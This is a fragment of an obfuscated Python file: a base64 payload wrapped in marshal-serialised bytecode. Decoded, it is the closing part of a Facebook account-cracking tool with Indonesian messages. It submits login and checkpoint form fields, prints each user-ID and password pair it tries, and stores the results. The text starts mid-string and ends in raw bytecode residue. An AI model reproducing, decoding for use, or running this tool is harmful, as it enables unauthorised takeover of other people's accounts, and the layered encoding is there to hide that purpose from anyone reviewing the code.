IjogZHRzZywiZmJfZHRzZyI6IGR0c2csImphem9lc3QiOiBqenN0LCJqYXpvZXN0IjoganpzdCwiY2hlY2twb2ludF9kYXRhIjoiIiwic3VibWl0W0NvbnRpbnVlXSI6Ikxhbmp1dGthbiIsIm5oIjogbmh9DQoJCXRlbXBlayA9IHBhcnNlcihzZXMucG9zdChtYitmb3JtWyJhY3Rpb24iXSwgZGF0YT1kYXRhRCkudGV4dCwgImh0bWwucGFyc2VyIikNCgkJbmdldyA9IFt5eS50ZXh0IGZvciB5eSBpbiB0ZW1wZWsuZmluZF9hbGwoIm9wdGlvbiIpXQ0KCQlwcmludChmIlxye0h9W+KAol17S33ilaTilrrilaTilroge0l9e3VpZH3igKJ7cHd9IikNCgkJZm9yIG9wdCBpbiByYW5nZShsZW4obmdldykpOg0KCQkJamFsYW4oZiJ7VX1be0J9e3N0cihvcHQrMSl9e1V9XXtJfeKVpOKWuuKVpOKWuuKVpOKWuiB7VX1be0J9e25nZXdbb3B0XX17VX0iKQ0KCQlpZiAiMCIgaW4gc3RyKGxlbihuZ2V3KSk6DQoJCQlqYWxhbihmIntIfVvigKJde0l9IEhvcmUgYWt1bnlhIHRhYiB5ZXNzcywgc2lsYWhrYW4gZGkgbG9naW4gIikNCgllbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQoJCWphbGFuKGYiXHJ7SH1b4oCiXXtLfeKVpOKWuuKVpOKWuuKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd30iKQ0KCWVsc2U6DQoJCWphbGFuKGYiXHJ7SH1b4oCiXXtLfeKVpOKWuuKVpOKWuuKVpOKWuuKVpOKWuiB7SX17dWlkfeKAontwd30iKQ0KDQoNCmlmIF9fbmFtZV9fPT0iX19tYWluX18iOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIG1rZGlyX2RhdGFfbG9naW4oKQ0KICAgIG1lbnUoKQ==(\x02\x00\x00\x00t\x06\x00\x00\x00base64t\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00<roy>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01(\x02\x00\x00\x00t\x07\x00\x00\x00marshalt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00<roy>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x0c\x01'))
